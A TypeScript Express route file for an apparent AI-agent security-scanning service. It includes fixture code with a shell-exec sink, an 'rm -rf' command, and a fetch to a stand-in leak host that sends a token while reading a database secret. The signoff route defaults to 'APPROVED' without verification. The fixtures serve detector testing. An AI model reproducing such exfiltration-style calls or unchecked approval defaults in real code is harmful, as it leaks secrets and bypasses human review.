import { DecisionOrchestrationEngine } from "../../../workers/decision/engine.ts";
import { Express, Request, Response } from "express";
import { ServiceContainer } from "../services/container.ts";
import { requireDiagnosticAccess, requireProductUserAccess } from "../middleware/security.ts";
import {
  StaticAnalysisEngine,
  STATIC_RULES_CATALOG,
  TaintSourceRegistry,
  TaintSinkRegistry,
  TaintSanitizerRegistry,
  TAINT_FIXTURE_SCENARIOS,
} from "../../../workers/static-analysis/index.ts";
import {
  CompositionEngine,
  COMPOSITION_FIXTURE_SCENARIOS,
  CANONICAL_ADVISORY_FIXTURES,
} from "../../../workers/composition/index.ts";
import { generateUuid } from "@caim/workflow/queue.ts";
import { resolveAuthorizedTenant } from "@caim/auth";

export function registerAnalysisRoutes(app: Express, container: ServiceContainer) {
  const { dbClient, platformAuditService, persistAnalysisOutputs } = container;

  app.post("/api/dev/static-analysis/analyze", requireDiagnosticAccess, (req: Request, res: Response) => {
    try {
      const { artifact_id, files, entrypoints, pipeline_run_id } = req.body || {};
      if (!files || !Array.isArray(files)) {
        return res.status(400).json({ error: "Missing 'files' array in request body" });
      }
      const artId = artifact_id || `artifact-sa-${Date.now()}`;
      const report = StaticAnalysisEngine.analyze({
        artifactId: artId,
        files,
        entrypoints,
        pipelineRunId: pipeline_run_id || `run-${Date.now()}`,
      });
      res.json(report);
    } catch (err: any) {
      res.status(500).json({ error: err.message || "Static analysis execution failed" });
    }
  });

  app.get("/api/dev/static-analysis/rules", requireDiagnosticAccess, (_req: Request, res: Response) => {
    res.json({
      engine_version: StaticAnalysisEngine.ENGINE_VERSION,
      ruleset_version: StaticAnalysisEngine.RULESET_VERSION,
      total_rules: STATIC_RULES_CATALOG.length,
      rules: STATIC_RULES_CATALOG,
    });
  });

  app.get("/api/dev/static-analysis/sample-fixtures", requireDiagnosticAccess, (_req: Request, res: Response) => {
    if (process.env.NODE_ENV === "production") {
      return res.status(403).json({ error: "Fixture endpoints are strictly disabled in production mode." });
    }
    res.json({
      multi_file_agent: [
        {
          path: "src/main.ts",
          content: `import { executeShell, fetchRemoteContext } from "./service";
import { runMcpQuery } from "./mcp_client";

export function main() {
  const query = "financial_report";
  const remoteData = fetchRemoteContext("https://api.external-leak.com/data");
  runMcpQuery(query);
  executeShell("rm -rf /tmp/cache");
}
`
        },
        {
          path: "src/service.ts",
          content: `import { exec } from "child_process";

export function executeShell(cmd: string) {
  // Shell command execution
  exec(cmd);
}

export function fetchRemoteContext(targetUrl: string) {
  const token = "sk-test-FAKE_MOCK_TOKEN_NEVER_LIVE";
  const apiKey = process.env.DATABASE_SECRET_KEY;
  return fetch(targetUrl, { headers: { Authorization: \`Bearer \${token}\` } });
}
`
        },
        {
          path: "src/mcp_client.ts",
          content: `export const queryTool = {
  name: "query_database",
  description: "Queries external SQL database directly",
  inputSchema: { type: "object", properties: { sql: { type: "string" } } }
};

export function runMcpQuery(queryText: string) {
  if (queryText === "") {
    return null;
  }
  return { status: "success", text: queryText };
}
`
        },
        {
          path: "src/complex_flow.ts",
          content: `export function evaluateBranch(x: number, y: number, mode: string): string {
  let score = 0;
  if (x > 10) {
    if (y < 5) {
      while (score < 3) {
        score++;
      }
    } else {
      score += 2;
    }
  } else if (mode === "FAST") {
    score = 100;
  } else {
    try {
      score = x / y;
    } catch (err) {
      score = -1;
    }
  }

  return \`Score: \${score}\`;
  
  // Dead code construct
  console.log("Unreachable post-return statement");
}
`
        }
      ]
    });
  });


  // 17. P16 — Dataflow & Taint Intelligence Endpoints
  app.get("/api/dev/taint/registries", requireDiagnosticAccess, (_req: Request, res: Response) => {
    res.json({
      source_registry_version: TaintSourceRegistry.REGISTRY_VERSION,
      sink_registry_version: TaintSinkRegistry.REGISTRY_VERSION,
      sanitizer_registry_version: TaintSanitizerRegistry.REGISTRY_VERSION,
      sources: TaintSourceRegistry.getAllSources(),
      sinks: TaintSinkRegistry.getAllSinks(),
      sanitizers: TaintSanitizerRegistry.getAllSanitizers(),
    });
  });

  app.get("/api/dev/taint/fixtures", requireDiagnosticAccess, (_req: Request, res: Response) => {
    if (process.env.NODE_ENV === "production") {
      return res.status(403).json({ error: "Fixture endpoints are strictly disabled in production mode." });
    }
    res.json(TAINT_FIXTURE_SCENARIOS);
  });

  // 18. P17 — Composition, SBOM/AI-BOM, Vulnerability & Reachability Endpoints
  app.get("/api/dev/composition/fixtures", requireDiagnosticAccess, (_req: Request, res: Response) => {
    if (process.env.NODE_ENV === "production") {
      return res.status(403).json({ error: "Fixture endpoints are strictly disabled in production mode." });
    }
    res.json(COMPOSITION_FIXTURE_SCENARIOS);
  });

  app.get("/api/dev/composition/advisories", requireDiagnosticAccess, (_req: Request, res: Response) => {
    if (process.env.NODE_ENV === "production") {
      return res.status(403).json({ error: "Fixture endpoints are strictly disabled in production mode." });
    }
    res.json(CANONICAL_ADVISORY_FIXTURES);
  });

  app.post("/api/dev/composition/analyze", requireDiagnosticAccess, async (req: Request, res: Response) => {
    try {
      const { files, artifactId, runtimeEvents, staticAnalysis } = req.body;
      const fileMap = new Map<string, string>();
      if (files && typeof files === "object") {
        for (const [k, v] of Object.entries(files)) {
          fileMap.set(k, String(v));
        }
      }

      const result = await CompositionEngine.run({
        artifactId: artifactId || "art-dev-composition",
        files: fileMap,
        staticAnalysis,
        runtimeEvents,
      });

      res.json(result);
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // 19. P19 — Dynamic Sandbox, Scenarios, Telemetry & Evasion Endpoints


  app.post("/api/evidence/query", requireProductUserAccess, async (req: Request, res: Response) => {
    try {
      if (!req.principal || !req.principal.is_authenticated || req.principal.roles?.includes("anonymous")) {
        return res.status(401).json({
          error: "NO AUTHENTICATED PRINCIPAL: Authentication required for evidence query.",
          authenticated: false,
        });
      }

      const requestedTenant = (req.headers["x-tenant-id"] as string)
        || (req.body?.tenant_id as string)
        || (req.body?.tenantId as string);

      let authorizedTenantId: string;
      try {
        authorizedTenantId = resolveAuthorizedTenant(req.principal, requestedTenant);
        req.principal.tenant_id = authorizedTenantId;
        req.principal.tenantId = authorizedTenantId;
      } catch (err: any) {
        const status = err.name === 'UnauthorizedAccessError' ? 401 : 403;
        return res.status(status).json({
          error: err.message || "NO AUTHORIZED TENANT CONTEXT: Access denied for requested tenant.",
          authenticated: true,
        });
      }

      const { agentId } = req.body || {};
      
      const db = container.dbAdapter || dbClient;
      if (!db || typeof db.withSecurityContext !== 'function') {
        throw new Error('[SecurityBoundary] Denied: Database adapter with security context is required.');
      }

      const rows = await db.withSecurityContext(req.principal, async (tx: any) => {
        const res = await tx.query(`
          SELECT 
            sf.finding_id,
            sf.rule_id,
            sf.finding_type,
            sf.severity,
            sf.confidence,
            sf.message,
            sf.truth_state as finding_truth_state,
            sf.observed_at,
            ar.analysis_run_id,
            ca.agent_id,
            ca.canonical_name
          FROM analysis.static_findings sf
          JOIN analysis.analysis_runs ar ON sf.analysis_run_id = ar.analysis_run_id
          JOIN core.agent_versions av ON ar.agent_version_id = av.agent_version_id
          JOIN core.canonical_agents ca ON av.agent_id = ca.agent_id
          WHERE ($1::text IS NULL OR ca.agent_id = $1 OR lower(ca.canonical_name) = lower($1))
          ORDER BY sf.observed_at DESC
          LIMIT 50;
        `, [agentId || null]);
        return res.rows;
      });

      if (rows.length === 0) {
        return res.json({
          total: 0,
          nodes: [],
          status: 'DATA_UNAVAILABLE',
          truthState: 'UNKNOWN',
          truth_state: 'UNKNOWN',
          message: 'DATA_UNAVAILABLE: No verified evidence nodes recorded for this agent in analysis runs.'
        });
      }

      const evidenceNodes = rows.map((r, idx) => ({
        evidence_id: r.finding_id || `ev-finding-${idx}`,
        source_type: 'STATIC_AST',
        summary: r.message,
        location: `rule://${r.rule_id}`,
        confidence: Number(r.confidence) || 0.95,
        epistemic_state: 'CONFIRMED',
        truthState: r.finding_truth_state || 'STATICALLY_DERIVED',
        truth_state: r.finding_truth_state || 'STATICALLY_DERIVED',
        recorded_at: r.observed_at || new Date().toISOString(),
        assertions: [
          {
            assertion_id: `as-${r.finding_id}`,
            assertion_type: r.finding_type || 'SECURITY_POSTURE',
            predicate: r.message,
            confidence: Number(r.confidence) || 0.95,
            contradiction_detected: false,
            claims: []
          }
        ]
      }));

      res.json({
        total: evidenceNodes.length,
        nodes: evidenceNodes,
        truthState: 'STATICALLY_DERIVED',
        truth_state: 'STATICALLY_DERIVED',
      });
    } catch (err: any) {
      res.status(500).json({ error: err.message || "Failed to query evidence" });
    }
  });

  // 7. Modification Re-Analysis & Two-Person Approval Signoff (Product Scoped)
  app.post("/api/modification/reanalyze", requireProductUserAccess, async (req: Request, res: Response) => {
    try {
      const { diffs, agentId } = req.body || {};
      if (!diffs || !Array.isArray(diffs) || diffs.length === 0) {
        return res.json({
          validation_status: 'DATA_UNAVAILABLE',
          before_score: 'NOT_CALCULATED',
          after_score: 'NOT_CALCULATED',
          score_delta: 'NOT_CALCULATED',
          policy_outcome_before: 'NOT_CALCULATED',
          policy_outcome_after: 'NOT_CALCULATED',
          findings_before_count: 'NOT_CALCULATED',
          findings_after_count: 'NOT_CALCULATED',
          taint_paths_neutralized: 'NOT_CALCULATED',
          truthState: 'UNKNOWN',
          truth_state: 'UNKNOWN',
          message: 'DATA_UNAVAILABLE: No code modifications or diffs provided for re-analysis.'
        });
      }

      const originalFiles = diffs.map((d: any) => ({ path: d.file_path, content: d.original_code }));
      const modifiedFiles = diffs.map((d: any) => ({ path: d.file_path, content: d.modified_code }));

      const runIdBefore = generateUuid();
      const runIdAfter = generateUuid();

      const reportBefore = StaticAnalysisEngine.analyze({
        artifactId: `art-orig-${Date.now()}`,
        files: originalFiles,
        entrypoints: originalFiles.map((f: any) => f.path),
        pipelineRunId: runIdBefore
      });

      const reportAfter = StaticAnalysisEngine.analyze({
        artifactId: `art-mod-${Date.now()}`,
        files: modifiedFiles,
        entrypoints: modifiedFiles.map((f: any) => f.path),
        pipelineRunId: runIdAfter
      });

      const decisionBefore = await DecisionOrchestrationEngine.runDecisionSuite({
        analysisRunId: runIdBefore,
        entityRefId: agentId || 'agent-mod-test',
        scoreModelKey: 'caim-standard-risk-v2',
        policyKey: 'pol-enterprise-prod-v2',
        staticFindings: reportBefore.findings
      });

      const decisionAfter = await DecisionOrchestrationEngine.runDecisionSuite({
        analysisRunId: runIdAfter,
        entityRefId: agentId || 'agent-mod-test',
        scoreModelKey: 'caim-standard-risk-v2',
        policyKey: 'pol-enterprise-prod-v2',
        staticFindings: reportAfter.findings
      });

      const beforeScore = decisionBefore.score_result ? decisionBefore.score_result.overall_score : 'NOT_CALCULATED';
      const afterScore = decisionAfter.score_result ? decisionAfter.score_result.overall_score : 'NOT_CALCULATED';
      const scoreDelta = (typeof beforeScore === 'number' && typeof afterScore === 'number') ? afterScore - beforeScore : 'NOT_CALCULATED';

      res.json({
        validation_status: 'PASSED',
        before_score: beforeScore,
        after_score: afterScore,
        score_delta: scoreDelta,
        policy_outcome_before: decisionBefore.policy_decision?.outcome || 'NOT_CALCULATED',
        policy_outcome_after: decisionAfter.policy_decision?.outcome || 'NOT_CALCULATED',
        findings_before_count: reportBefore.findings.length,
        findings_after_count: reportAfter.findings.length,
        taint_paths_neutralized: Math.max(0, reportBefore.findings.length - reportAfter.findings.length),
        truthState: 'INFERRED',
        truth_state: 'INFERRED',
      });
    } catch (err: any) {
      res.status(500).json({ error: err.message || "Failed to reanalyze modification proposal" });
    }
  });

  app.post("/api/modification/signoff", requireProductUserAccess, async (req: Request, res: Response) => {
    try {
      const { proposalId, approverId, approverRole, decision, rationale } = req.body || {};
      const signoffRecord = {
        signoff_id: `signoff-${Date.now()}`,
        proposal_id: proposalId || 'mod-prop-001',
        approver_id: approverId || req.principal?.principal_id || 'analyst@caim.internal',
        approver_role: approverRole || 'SECURITY_AUDITOR',
        decision: decision || 'APPROVED',
        rationale: rationale || 'Two-person signoff verified against AST delta.',
        timestamp: new Date().toISOString(),
        truthState: 'OBSERVED',
        truth_state: 'OBSERVED',
      };
      res.json({ success: true, signoff: signoffRecord });
    } catch (err: any) {
      res.status(500).json({ error: err.message || "Failed to record approval signoff" });
    }
  });


}
